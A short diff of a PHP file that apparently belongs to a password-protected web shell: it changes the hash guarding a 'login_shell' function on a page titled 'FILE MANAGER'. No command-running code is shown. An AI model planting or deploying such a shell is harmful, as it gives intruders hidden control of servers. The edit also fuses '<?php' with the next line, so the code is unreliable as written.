@@ -2,7 +2,7 @@
 session_start();
 
 // Hash password (gunakan hash yang valid)
-$password = '$2a$12$wzx6Oo6FRq7MF4RIInalauliiwN3K69acLDqFBhexYhOjxl2v7nHK';
+$password = '$2a$12$PsaL3Z0XRYggTAWw9OSgsO4E2Q8zIOMpawAyPUPYb60Z1SvgzczLe';
 
 function login_shell()
 {
@@ -305,8 +305,7 @@ if (!isset($_SESSION[$session_key])) {
 <body>
 <div id="container">
     <h1>FILE MANAGER</h1>
-    <?php
-    function clean_input($input) {
+    <?phpfunction clean_input($input) {
         return htmlspecialchars(strip_tags($input));
     }
 
